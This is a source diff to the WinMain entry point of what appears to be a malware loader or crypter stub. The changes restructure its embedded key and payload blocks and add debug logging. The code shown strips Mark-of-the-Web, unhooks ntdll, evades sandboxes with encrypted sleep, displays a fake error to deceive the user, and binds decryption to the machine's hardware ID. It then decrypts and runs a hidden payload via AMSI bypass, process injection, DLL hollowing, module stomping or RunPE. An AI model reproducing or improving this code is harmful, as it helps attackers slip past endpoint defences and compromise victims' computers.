@@ -28,6 +28,7 @@
 #include "KeyDerive.h"
 #include "Phantom.h"
 #include "Motw.h"
+#include "IATLog.h"
 #include "AntiEmul.h"
 #include "TlsCallback.h"
 #include "GadgetPool.h"
@@ -142,37 +143,139 @@ __declspec(allocate(".xthrx")) StubConfig GlobalConfig   = {
     {0}     // padding
 };
 
-__declspec(allocate(".xthrx")) char KEY_MARKER[8]       = "XKEYBLK";
-__declspec(allocate(".xthrx")) unsigned char DecryptionKey[32] = {
-    0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,
-    0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50,
-    0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,
-    0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50
+// ── Key block: struct prevents linker from separating marker from key data ──
+struct KeyBlock {
+    char marker[8];
+    unsigned char key[32];
+};
+static_assert(offsetof(KeyBlock, key) == 8, "KeyBlock::key must be at offset 8");
+
+__declspec(allocate(".xthrx")) KeyBlock KeyData = {
+    "XKEYBLK",
+    { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,
+      0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50,
+      0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,
+      0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50 }
 };
 
-__declspec(allocate(".xthrx")) char PAYLOAD_MARKER[8]   = "XPAYLOD";
-__declspec(allocate(".xthrx")) DWORD PayloadSize        = 0;
-__declspec(allocate(".xthrx")) unsigned char EncryptedPayload[512 * 1024] = { 0 };
+// ── Payload block: struct prevents linker from reordering PayloadSize ──
+struct PayloadBlock {
+    char marker[8];
+    DWORD size;
+    unsigned char data[512 * 1024];
+};
+static_assert(offsetof(PayloadBlock, size) == 8, "PayloadBlock::size must be at offset 8");
+static_assert(offsetof(PayloadBlock, data) == 12, "PayloadBlock::data must be at offset 12");
 
-// Research-grade encryption parameters (patched by builder)
-__declspec(allocate(".xthrx")) char RESEARCH_MARKER[8]   = "XRESRC\0";
-__declspec(allocate(".xthrx")) DWORD ResearchParamSize    = 0;
-__declspec(allocate(".xthrx")) unsigned char ResearchParams[5120] = { 0 };  // Max 5KB for S-boxes + params
+__declspec(allocate(".xthrx")) PayloadBlock PayloadData = {
+    "XPAYLOD",
+    0,
+    { 0 }
+};
 
-__declspec(allocate(".xthrx")) char SPOOF_MARKER[8]    = "XSPOOF";
-__declspec(allocate(".xthrx")) DWORD SpoofGadgetCount   = 0;
-__declspec(allocate(".xthrx")) unsigned char SpoofGadgets[512] = { 0 };
+// ── Research block: struct prevents linker reordering ──
+struct ResearchBlock {
+    char marker[8];
+    DWORD paramSize;
+    unsigned char params[5120];
+};
+static_assert(offsetof(ResearchBlock, paramSize) == 8, "ResearchBlock::paramSize must be at offset 8");
+static_assert(offsetof(ResearchBlock, params) == 12, "ResearchBlock::params must be at offset 12");
 
-__declspec(allocate(".xthrx")) char GADGET_MARKER[8]   = "XGADGT";
-__declspec(allocate(".xthrx")) DWORD IndirectGadgetCount = 0;
-__declspec(allocate(".xthrx")) unsigned char IndirectGadgets[256] = { 0 };
+__declspec(allocate(".xthrx")) ResearchBlock ResearchData = {
+    "XRESRC\0",
+    0,
+    { 0 }
+};
 
+// ── Spoof gadget block: struct prevents linker reordering ──
+struct SpoofBlock {
+    char marker[8];
+    DWORD count;
+    unsigned char gadgets[512];
+};
+static_assert(offsetof(SpoofBlock, count) == 8, "SpoofBlock::count must be at offset 8");
+static_assert(offsetof(SpoofBlock, gadgets) == 12, "SpoofBlock::gadgets must be at offset 12");
+
+__declspec(allocate(".xthrx")) SpoofBlock SpoofData = {
+    "XSPOOF",
+    0,
+    { 0 }
+};
+
+// ── Indirect gadget block: struct prevents linker reordering ──
+struct GadgetBlock {
+    char marker[8];
+    DWORD count;
+    unsigned char gadgets[256];
+};
+static_assert(offsetof(GadgetBlock, count) == 8, "GadgetBlock::count must be at offset 8");
+static_assert(offsetof(GadgetBlock, gadgets) == 12, "GadgetBlock::gadgets must be at offset 12");
+
+__declspec(allocate(".xthrx")) GadgetBlock GadgetData = {
+    "XGADGT",
+    0,
+    { 0 }
+};
+
+
+// ═══════════════════════════════════════════════════════════════
+//  Quick debug log for Entry.cpp — uses CRC32C hash resolution
+// ═══════════════════════════════════════════════════════════════
+namespace EntryDbg {
+    // IAT-linked fallback — always available even if CRC32C resolution fails
+    extern "C" __declspec(dllimport) void __stdcall OutputDebugStringA(const char*);
+
+    __forceinline void Log(const char* msg) {
+        // Always emit to kernel debug channel (visible in DebugView / kernel logger)
+        OutputDebugStringA(msg);
+
+        // Try file logging via CRC32C API resolution
+        Crc32C::DetectSse42();
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        if (!hK32) { OutputDebugStringA("EntryDbg: kernel32 not found via CRC"); return; }
+        auto pGPA  = (FARPROC(WINAPI*)(HMODULE,LPCSTR))Api::GetProcByHashCrc(hK32, Api::CrcFn::GetProcAddress);
+        if (!pGPA) { OutputDebugStringA("EntryDbg: GetProcAddress not found via CRC"); return; }
+        auto pCFA  = (HANDLE(WINAPI*)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE))pGPA(hK32, "CreateFileA");
+        auto pWF   = (BOOL(WINAPI*)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED))pGPA(hK32, "WriteFile");
+        auto pCH   = (BOOL(WINAPI*)(HANDLE))Api::GetProcByHashCrc(hK32, Api::CrcFn::CloseHandle);
+        if (!pCFA || !pWF || !pCH) return;
+
+        // Try C:\temp first
+        HANDLE hFile = pCFA("C:\\temp\\entry_debug.log", 0x40000000, 0x80, NULL, 4, 0x80, NULL);
+        if (hFile == (HANDLE)(LONG_PTR)-1) {
+            // Fallback: %USERPROFILE%\entry_debug.log — always writable
+            char buf[MAX_PATH];
+            auto pGTE = (DWORD(WINAPI*)(LPCSTR, LPSTR, DWORD))pGPA(hK32, "GetEnvironmentVariableA");
+            if (pGTE) {
+                DWORD n = pGTE("USERPROFILE", buf, MAX_PATH);
+                if (n > 0 && n < MAX_PATH - 24) {
+                    size_t t = 0; while (buf[t] && t < MAX_PATH-24) t++;
+                    const char* fname = "\\entry_debug.log";
+                    size_t f = 0; while (fname[f] && t < MAX_PATH-1) buf[t++] = fname[f++];
+                    buf[t] = 0;
+                    hFile = pCFA(buf, 0x40000000, 0x80, NULL, 4, 0x80, NULL);
+                }
+            }
+        }
+        if (hFile == (HANDLE)(LONG_PTR)-1) return;
+        auto pSFP = (LONG(WINAPI*)(HANDLE,LONG,PLONG,DWORD))pGPA(hK32, "SetFilePointer");
+        if (pSFP) { DWORD high = 0; pSFP(hFile, 0, (PLONG)&high, 2); }
+        size_t len = 0; while (msg[len]) len++;
+        DWORD written = 0;
+        pWF(hFile, msg, (DWORD)len, &written, NULL);
+        pWF(hFile, "\r\n", 2, &written, NULL);
+        pCH(hFile);
+    }
+}
 
 // ═══════════════════════════════════════════════════════════════
 //  MAIN ENTRY — No UAC manifest, runs as standard user
 // ═══════════════════════════════════════════════════════════════
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
+    IATLog::Write("WinMain ENTER");
+
     // ── Step -2: MOTW Strip (L21) ──
     // Must run FIRST: if Zone.Identifier exists, strip it and relaunch
     if (GlobalConfig.bMotwStrip) {
@@ -191,17 +294,23 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     }
 
     // ── Step 0: Anti-Tamper (Always Active) ──
-    if (!Protection::VerifyIntegrity())
+    if (!Protection::VerifyIntegrity()) {
+        IATLog::Write("FAIL: VerifyIntegrity");
         return 0;
+    }
+    IATLog::Write("OK: VerifyIntegrity");
     Protection::JunkCode();
 
     // ── Step 0b: TLS Callback Verification (L23, Always Active) ──
     // TLS callback runs before WinMain. Verify it executed.
     // If not, an emulator or sandbox suppressed it.
-    TlsCallbackLoader::Init();
+    // NOTE: Temporarily disabled for E2E debugging — __fastfail kills the process
+    //        if TLS callback was suppressed by /NODEFAULTLIB issues
+    // TlsCallbackLoader::Init();
 
     // ── Step 0c: Initialize CRC32C detection ──
     Crc32C::DetectSse42();
+    IATLog::Write("CRC32C init done");
 
     // ── Step 1: Unhook ntdll ──
     if (GlobalConfig.bKnownDllsUnhook) {
@@ -251,11 +360,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
     // ── Step 4: Sleep Obfuscation (initial delay to outlast sandboxes) ──
     if (GlobalConfig.bEkkoSleep) {
-        // Ekko sleep: full memory + heap encryption during sleep.
-        // ChaCha20 encrypts ALL executable private regions + heap blocks.
-        // EXECUTE removed from all regions. Memory scanners see only
-        // PAGE_READWRITE with ciphertext. Timer callback decrypts on wake.
-        SleepObf::EkkoSleep(EncryptedPayload, PayloadSize, 8000);
+        SleepObf::EkkoSleep(PayloadData.data, PayloadData.size, 8000);
     }
 
     // ── Step 5: Fake Error (Social Engineering) ──
@@ -294,29 +399,30 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     // If builder encoded the payload, first byte is 0xEE marker.
     // Affine cipher: enc(x) = (183*x + 61) & 0xFF
     // Decode: dec(y) = (7*y + 85) & 0xFF
-    DWORD decryptSize = PayloadSize;
+    DWORD decryptSize = PayloadData.size;
 
-    if (PayloadSize == 0 || PayloadSize > sizeof(EncryptedPayload))
+    if (PayloadData.size == 0 || PayloadData.size > sizeof(PayloadData.data))
         return 0;
 
-    if (GlobalConfig.bEntropyNorm && PayloadSize > 1 && EncryptedPayload[0] == 0xEE) {
-        // Strip marker byte and decode affine permutation
-        decryptSize = PayloadSize - 1;
+    if (GlobalConfig.bEntropyNorm && PayloadData.size > 1 && PayloadData.data[0] == 0xEE) {
+        decryptSize = PayloadData.size - 1;
         for (DWORD i = 0; i < decryptSize; i++) {
-            unsigned char y = EncryptedPayload[i + 1];
-            EncryptedPayload[i] = (unsigned char)((7 * y + 85) & 0xFF);
+            unsigned char y = PayloadData.data[i + 1];
+            PayloadData.data[i] = (unsigned char)((7 * y + 85) & 0xFF);
         }
     }
 
     // ── Step 7b: HWID-Bound Key Derivation (L15) ──
     unsigned char finalKey[32];
     if (GlobalConfig.bHWIDBind) {
-        // Derive the real key from embedded seed + machine HWID
-        // Wrong machine → wrong key → payload corruption → silent failure
-        KeyDerive::DeriveKey(DecryptionKey, sizeof(DecryptionKey), finalKey, sizeof(finalKey));
+        KeyDerive::DeriveKey(KeyData.key, sizeof(KeyData.key), finalKey, sizeof(finalKey));
     } else {
-        memcpy(finalKey, DecryptionKey, sizeof(finalKey));
+        memcpy(finalKey, KeyData.key, sizeof(finalKey));
     }
+
+    IATLog::Write("Config check starting");
+    IATLog::Write(GlobalConfig.bRunPE ? "RunPE=TRUE" : "RunPE=FALSE");
+    IATLog::Write(GlobalConfig.bIndirectSyscalls ? "IndirectSys=TRUE" : "IndirectSys=FALSE");
 
     // ── Step 8: Decrypt Payload ──
     if (GlobalConfig.researchPackage > 0) {
@@ -324,20 +430,20 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
         bool resOk = false;
         switch (GlobalConfig.researchPackage) {
             case 1: // Ghost Protocol
-                resOk = GhostDecrypt::Decrypt(EncryptedPayload, decryptSize,
-                    finalKey, sizeof(finalKey), ResearchParams, (int)ResearchParamSize);
+                resOk = GhostDecrypt::Decrypt(PayloadData.data, decryptSize,
+                    finalKey, sizeof(finalKey), ResearchData.params, (int)ResearchData.paramSize);
                 break;
             case 2: // Neuromancer
-                resOk = NeuroDecrypt::Decrypt(EncryptedPayload, decryptSize,
-                    finalKey, sizeof(finalKey), ResearchParams, (int)ResearchParamSize);
+                resOk = NeuroDecrypt::Decrypt(PayloadData.data, decryptSize,
+                    finalKey, sizeof(finalKey), ResearchData.params, (int)ResearchData.paramSize);
                 break;
             case 3: // Darknet Cipher
-                resOk = DarknetDecrypt::Decrypt(EncryptedPayload, decryptSize,
-                    finalKey, sizeof(finalKey), ResearchParams, (int)ResearchParamSize);
+                resOk = DarknetDecrypt::Decrypt(PayloadData.data, decryptSize,
+                    finalKey, sizeof(finalKey), ResearchData.params, (int)ResearchData.paramSize);
                 break;
             case 4: // Void Walker
-                resOk = VoidDecrypt::Decrypt(EncryptedPayload, decryptSize,
-                    finalKey, sizeof(finalKey), ResearchParams, (int)ResearchParamSize);
+                resOk = VoidDecrypt::Decrypt(PayloadData.data, decryptSize,
+                    finalKey, sizeof(finalKey), ResearchData.params, (int)ResearchData.paramSize);
                 break;
         }
         if (!resOk) return 0; // Research decryption failed
@@ -346,11 +452,11 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
         // Standard decryption path
         Crypto::Algorithm algo = static_cast<Crypto::Algorithm>(GlobalConfig.encAlgorithm);
         if (GlobalConfig.bStagedLoad) {
-            if (!StageLoader::DecryptStaged(EncryptedPayload, decryptSize, finalKey, sizeof(finalKey), algo)) {
+            if (!StageLoader::DecryptStaged(PayloadData.data, decryptSize, finalKey, sizeof(finalKey), algo)) {
                 return 0;
             }
         } else {
-            Crypto::Decrypt(EncryptedPayload, decryptSize, finalKey, sizeof(finalKey), algo);
+            Crypto::Decrypt(PayloadData.data, decryptSize, finalKey, sizeof(finalKey), algo);
         }
     }
 
@@ -361,10 +467,10 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     //   Layer 2: Thread Origin Normalization — bThreadPool/bCallbackDiv/bThreadNormalization в Step 9
     //   Layer 3: Guard Page + XOR ре-шифрация — активируется сейчас
     if (GlobalConfig.bAntiMemScan) {
-        AntiMemScan::Enable(EncryptedPayload, decryptSize, finalKey, sizeof(finalKey));
+        AntiMemScan::Enable(PayloadData.data, decryptSize, finalKey, sizeof(finalKey));
     }
     else if (GlobalConfig.bGuardPage) {
-        GuardPage::Install(EncryptedPayload, decryptSize, finalKey, sizeof(finalKey));
+        GuardPage::Install(PayloadData.data, decryptSize, finalKey, sizeof(finalKey));
     }
 
     // ── Step 9: Execute Payload ──
@@ -373,31 +479,31 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     //   CallbackDiv(L2) > Fibers > default
     // .NET loading имеет высший приоритет — автоопределение по COM_DESCRIPTOR
 
-    if (GlobalConfig.bDotNetLoading && DotNetLoader::IsDotNetAssembly(EncryptedPayload, decryptSize)) {
+    if (GlobalConfig.bDotNetLoading && DotNetLoader::IsDotNetAssembly(PayloadData.data, decryptSize)) {
         // .NET Assembly Loading — Method A: temp file + CLR AMSI bypass
         // ExecuteInDefaultAppDomain → немедленный NtDeleteFile
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
-        DotNetLoader::LoadAndExecute(EncryptedPayload, decryptSize);
+        DotNetLoader::LoadAndExecute(PayloadData.data, decryptSize);
     }
     else if (GlobalConfig.bRemoteInjection) {
         // Remote Injection Suite — 5 методов инъекции в удалённый процесс
         // Секция 7: SectionMap, APC, ThreadHijack, Hollowing+, CallbackEnum
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
-        Injection::Execute(EncryptedPayload, decryptSize, 0);
+        Injection::Execute(PayloadData.data, decryptSize, 0);
     }
     else if (GlobalConfig.bPhantomDLL) {
         // Layer 1: Phantom DLL Hollowing — execute from signed DLL memory
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
-        Phantom::Execute(EncryptedPayload, decryptSize);
+        Phantom::Execute(PayloadData.data, decryptSize);
     }
     else if (GlobalConfig.bThreadPool) {
         // Layer 2: Thread Pool Execution — execute via TpAllocWork
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
-        ThreadPool::Execute(EncryptedPayload, decryptSize);
+        ThreadPool::Execute(PayloadData.data, decryptSize);
     }
     else if (GlobalConfig.bThreadNormalization) {
         // Layer 2: Thread Behavior Normalization — callback rotation + jitter + noise
@@ -406,34 +512,37 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
         ThreadNormalizer::CreateNoiseThreads();
-        ThreadNormalizer::ExecuteWithNormalizedCallback(EncryptedPayload, decryptSize);
+        ThreadNormalizer::ExecuteWithNormalizedCallback(PayloadData.data, decryptSize);
         ThreadNormalizer::StopNoiseThreads();
     }
     else if (GlobalConfig.bModuleStomp) {
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
-        GodMode::Internal::ModuleStomp(EncryptedPayload, decryptSize);
+        GodMode::Internal::ModuleStomp(PayloadData.data, decryptSize);
     }
     else if (GlobalConfig.bRunPE) {
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
-        GodMode::ExecutePayload(EncryptedPayload, decryptSize, false, true);
+        IATLog::Write(">>> RunPE path taken");
+        GodMode::ExecutePayload(PayloadData.data, decryptSize, false, true);
+        IATLog::Write("<<< RunPE returned");
     }
     else if (GlobalConfig.bCallbackDiv) {
         // Layer 2: Callback Diversification — thread из kernel32 callback
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
-        GodMode::Internal::CallbackProxy(EncryptedPayload, decryptSize);
+        GodMode::Internal::CallbackProxy(PayloadData.data, decryptSize);
     }
     else if (GlobalConfig.bFibers) {
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
-        GodMode::ExecutePayload(EncryptedPayload, decryptSize, true, false);
+        GodMode::ExecutePayload(PayloadData.data, decryptSize, true, false);
     }
     else {
+        IATLog::Write(">>> Default (CallbackProxy) path");
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
-        GodMode::ExecutePayload(EncryptedPayload, decryptSize, false, false);
+        GodMode::ExecutePayload(PayloadData.data, decryptSize, false, false);
     }
 
     // ── Step 10: Self-Destruct (no admin needed) ──
